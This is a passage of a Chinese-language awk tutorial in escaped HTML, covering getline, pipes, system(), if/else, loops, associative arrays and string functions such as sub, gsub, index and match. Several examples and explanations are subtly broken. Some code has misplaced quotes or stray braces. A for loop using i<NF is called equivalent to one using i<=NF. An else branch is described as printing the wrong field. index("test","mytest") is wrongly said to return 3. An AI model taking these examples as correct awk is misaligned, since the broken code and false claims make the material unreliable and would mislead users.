&lt;p&gt;&lt;code&gt;$ awk &amp;#39;BEGIN{&amp;quot;date&amp;quot; | getline d; split(d,mon); print mon[2]}&amp;#39; test&lt;/code&gt;。执行shell的date命令，并通过管道输出给getline，然后getline从管道中读取并将输入赋值给d，split函数把变量d转化成数组mon，然后打印数组mon的第二个元素。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;BEGIN{while( &amp;quot;ls&amp;quot; | getline) print}&amp;#39;&lt;/code&gt;，命令ls的输出传递给geline作为输入，循环使getline从ls的输出中读取一行，并把它打印到屏幕。这里没有输入文件，因为BEGIN块在打开输入文件前执行，所以可以忽略输入文件。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;BEGIN{printf &amp;quot;What is your name &amp;quot;; getline name &amp;amp;lt; &amp;quot;/dev/tty&amp;quot; } $1 ~name {print &amp;quot;Found&amp;quot; name on line &amp;quot;, NR &amp;quot;.&amp;quot;} END{print &amp;quot;See you,&amp;quot; name &amp;quot;.&amp;quot;} test&lt;/code&gt;。在屏幕上打印”What is your name “,并等待用户应答。当一行输入完毕后，getline函数从终端接收该行输入，并把它储存在自定义变量name中。如果第一个域匹配变量name的值，print函数就被执行，END块打印See you和name的值。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;BEGIN{while (getline &amp;amp;lt; &amp;quot;/etc/passwd&amp;quot; &amp;amp;gt; 0) lc++; print lc}&amp;#39;&lt;/code&gt;。awk将逐行读取文件/etc/passwd的内容，在到达文件末尾前，计数器lc一直增加，当到末尾时，打印lc的值。注意，如果文件不存在，getline返回-1，如果到达文件的末尾就返回0，如果读到一行，就返回1，所以命令 &lt;code&gt;while (getline &amp;lt; &amp;quot;/etc/passwd&amp;quot;)&lt;/code&gt;在文件不存在的情况下将陷入无限循环，因为返回-1表示逻辑真。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;可以在awk中打开一个管道，且同一时刻只能有一个管道存在。通过close()可关闭管道。如：&lt;code&gt;$ awk &amp;#39;{print $1, $2 | &amp;quot;sort&amp;quot; }&amp;#39; test END {close(&amp;quot;sort&amp;quot;)}&lt;/code&gt;。awd把print语句的输出通过管道作为linux命令sort的输入,END块执行关闭管道操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;system函数可以在awk中执行linux的命令。如：&lt;code&gt;$ awk &amp;#39;BEGIN{system(&amp;quot;clear&amp;quot;)&amp;#39;&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fflush函数用以刷新输出缓冲区，如果没有参数，就刷新标准输出的缓冲区，如果以空字符串为参数，如fflush(“”),则刷新所有文件和管道的输出缓冲区。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;14-5-条件语句&quot;&gt;&lt;a href=&quot;#14-5-条件语句&quot; class=&quot;headerlink&quot; title=&quot;14.5. 条件语句&quot;&gt;&lt;/a&gt;14.5. 条件语句&lt;/h3&gt;&lt;p&gt;awk中的条件语句是从C语言中借鉴过来的，可控制程序的流程。&lt;/p&gt;
&lt;h4 id=&quot;14-5-1-if语句&quot;&gt;&lt;a href=&quot;#14-5-1-if语句&quot; class=&quot;headerlink&quot; title=&quot;14.5.1. if语句&quot;&gt;&lt;/a&gt;14.5.1. if语句&lt;/h4&gt;&lt;p&gt;格式：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;if (expression)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{if ($1 &amp;amp;lt;$2) print $2 &amp;quot;too high&amp;quot;}&amp;#39; test&lt;/code&gt;。如果第一个域小于第二个域则打印。&lt;br&gt;&lt;code&gt;$ awk &amp;#39;{if ($1 &amp;amp;lt; $2) {count++; print &amp;quot;ok&amp;quot;}}&amp;#39; test&lt;/code&gt;.如果第一个域小于第二个域，则count加一，并打印ok。&lt;/p&gt;
&lt;h4 id=&quot;14-5-2-if-else语句，用于双重判断。&quot;&gt;&lt;a href=&quot;#14-5-2-if-else语句，用于双重判断。&quot; class=&quot;headerlink&quot; title=&quot;14.5.2. if/else语句，用于双重判断。&quot;&gt;&lt;/a&gt;14.5.2. if/else语句，用于双重判断。&lt;/h4&gt;&lt;p&gt;格式：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;if (expression)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{if ($1 &amp;amp;gt; 100) print $1 &amp;quot;bad&amp;quot; ; else print &amp;quot;ok&amp;quot;}&amp;#39; test&lt;/code&gt;。如果$1大于100则打印$1 bad,否则打印ok。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{if ($1 &amp;amp;gt; 100){ count++; print $1} else {count--; print $2}&amp;#39; test&lt;/code&gt;。如果$1大于100，则count加一，并打印$1，否则count减一，并打印$1。&lt;/p&gt;
&lt;h4 id=&quot;14-5-3-if-else-else-if语句，用于多重判断。&quot;&gt;&lt;a href=&quot;#14-5-3-if-else-else-if语句，用于多重判断。&quot; class=&quot;headerlink&quot; title=&quot;14.5.3. if/else else if语句，用于多重判断。&quot;&gt;&lt;/a&gt;14.5.3. if/else else if语句，用于多重判断。&lt;/h4&gt;&lt;p&gt;格式：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;if (expression)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;else if (expression)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;else if (expression)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           statement; statement; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;14-6-循环&quot;&gt;&lt;a href=&quot;#14-6-循环&quot; class=&quot;headerlink&quot; title=&quot;14.6. 循环&quot;&gt;&lt;/a&gt;14.6. 循环&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;awk有三种循环:while循环；for循环；special for循环。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{ i = 1; while ( i &amp;amp;lt;= NF ) { print NF,$i; i++}}&amp;#39; test&lt;/code&gt;。变量的初始值为1，若i小于可等于NF(记录中域的个数),则执行打印语句，且i增加1。直到i的值大于NF.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{for (i = 1; i&amp;amp;lt;NF; i++) print NF,$i}&amp;#39; test&lt;/code&gt;。作用同上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;breadkcontinue语句。break用于在满足条件的情况下跳出循环；continue用于在满足条件的情况下忽略后面的语句，直接返回循环的顶端。如：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;for ( x=3; x&amp;amp;lt;=NF; x++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if ($x&amp;amp;lt;0)&amp;#123;print &amp;quot;Bottomed out!&amp;quot;; break&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;for ( x=3; x&amp;amp;lt;=NF; x++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if ($x==0)&amp;#123;print &amp;quot;Get next item&amp;quot;; continue&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;next语句从输入文件中读取一行，然后从头开始执行awk脚本。如：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;if ($1 ~/test/)&amp;#123;next&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else &amp;#123;print&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;exit语句用于结束awk程序，但不会略过END块。退出状态为0代表成功，非零值表示出错。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;14-7-数组&quot;&gt;&lt;a href=&quot;#14-7-数组&quot; class=&quot;headerlink&quot; title=&quot;14.7. 数组&quot;&gt;&lt;/a&gt;14.7. 数组&lt;/h3&gt;&lt;p&gt;awk中的数组的下标可以是数字和字母，称为关联数组。&lt;/p&gt;
&lt;h4 id=&quot;14-7-1-下标与关联数组&quot;&gt;&lt;a href=&quot;#14-7-1-下标与关联数组&quot; class=&quot;headerlink&quot; title=&quot;14.7.1. 下标与关联数组&quot;&gt;&lt;/a&gt;14.7.1. 下标与关联数组&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;用变量作为数组下标。如：&lt;code&gt;$ awk {name[x++]=$2};END{for(i=0;i&amp;amp;lt;NR;i++) print i,name[i]}&amp;#39; test&lt;/code&gt;。数组name中的下标是一个自定义变量x，awk初始化x的值为0，在每次使用后增加1。第二个域的值被赋给name数组的各个元素。在END模块中，for循环被用于循环整个数组，从下标为0的元素开始，打印那些存储在数组中的值。因为下标是关健字，所以它不一定从0开始，可以从任何值开始。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;special for循环用于读取关联数组中的元素。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;for (item in arrayname)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         print arrayname[item]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;/^tom/{name[NR]=$1}; END{for(i in name){print name[i]}}&amp;#39; test&lt;/code&gt;。打印有值的数组元素。打印的顺序是随机的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用字符串作为下标。如：count[“test”]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用域值作为数组的下标。一种新的for循环方式，&lt;code&gt;for (index_value in array) statement&lt;/code&gt;。如:&lt;code&gt;$ awk &amp;#39;{count[$1]++} END{for(name in count) print name,count[name]}&amp;#39; test&lt;/code&gt;。该语句将打印$1中字符串出现的次数。它首先以第一个域作数组count的下标，第一个域变化，索引就变化。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;delete函数用于删除数组元素。如：&lt;code&gt;$ awk &amp;#39;{line[x++]=$1} END{for(x in line) delete(line[x])}&amp;#39; test&lt;/code&gt;。分配给数组line的是第一个域的值，所有记录处理完成后，special for循环将删除每一个元素。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;14-8-awk的内建函数&quot;&gt;&lt;a href=&quot;#14-8-awk的内建函数&quot; class=&quot;headerlink&quot; title=&quot;14.8. awk的内建函数&quot;&gt;&lt;/a&gt;14.8. awk的内建函数&lt;/h3&gt;&lt;h4 id=&quot;14-8-1-字符串函数&quot;&gt;&lt;a href=&quot;#14-8-1-字符串函数&quot; class=&quot;headerlink&quot; title=&quot;14.8.1. 字符串函数&quot;&gt;&lt;/a&gt;14.8.1. 字符串函数&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;sub函数匹配记录中最大、最靠左边的子字符串的正则表达式，并用替换字符串替换这些字符串。如果没有指定目标字符串就默认使用整个记录。替换只发生在第一次匹配的时候。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sub (regular expression, substitution string):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sub (regular expression, substitution string, target string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; sub(/test/, &amp;quot;mytest&amp;quot;); print &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; sub(/test/, &amp;quot;mytest&amp;quot;); $1&amp;#125;; print &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个例子在整个记录中匹配，替换只发生在第一次匹配发生的时候。如要在整个文件中进行匹配需要用到gsub&lt;/p&gt;
&lt;p&gt;第二个例子在整个记录的第一个域中进行匹配，替换只发生在第一次匹配发生的时候。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;gsub函数作用如sub，但它在整个文档中进行匹配。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gsub (regular expression, substitution string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gsub (regular expression, substitution string, target string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; gsub(/test/, &amp;quot;mytest&amp;quot;); print &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; gsub(/test/, &amp;quot;mytest&amp;quot;), $1 &amp;#125;; print &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个例子在整个文档中匹配test，匹配的都被替换成mytest。&lt;/p&gt;
&lt;p&gt;第二个例子在整个文档的第一个域中匹配，所有匹配的都被替换成mytest。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;index函数返回子字符串第一次被匹配的位置，偏移量从位置1开始。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;index(string, substring)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; print index(&amp;quot;test&amp;quot;, &amp;quot;mytest&amp;quot;) &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例返回test在mytest的位置，结果应该是3。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;length函数返回记录的字符数。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;length( string )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;length&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; print length( &amp;quot;test&amp;quot; ) &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; print length &amp;#125;&amp;apos; testfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个实例返回test字符串的长度。&lt;/p&gt;
&lt;p&gt;第二个实例返回testfile文件中第条记录的字符数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;substr函数返回从位置1开始的子字符串，如果指定长度超过实际长度，就返回整个字符串。格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;substr( string, starting position )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;substr( string, starting position, length of string )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123; print substr( &amp;quot;hello world&amp;quot;, 7,11 ) &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上例截取了world子字符串。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;match函数返回在字符串中正则表达式位置的索引，如果找不到指定的正则表达式则返回0。match函数会设置内建变量RSTART为字符串中子字符串的开始位置，RLENGTH为到子字符串末尾的字符个数。substr可利于这些变量来截取字符串。函数格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;match( string, regular expression )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123;start=match(&amp;quot;this is a test&amp;quot;,/[a-z]+$/); print start&amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;apos;&amp;#123;start=match(&amp;quot;this is a test&amp;quot;,/[a-z]+$/); print start, RSTART, RLENGTH &amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个实例打印以连续小写字符结尾的开始位置，这里是11。&lt;/p&gt;
&lt;p&gt;第二个实例还打印RSTART和RLENGTH变量，这里是11(start)，11(RSTART)，4(RLENGTH)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;toupper和tolower函数可用于字符串大小间的转换，该功能只在gawk中有效。格式如下：&lt;/p&gt;
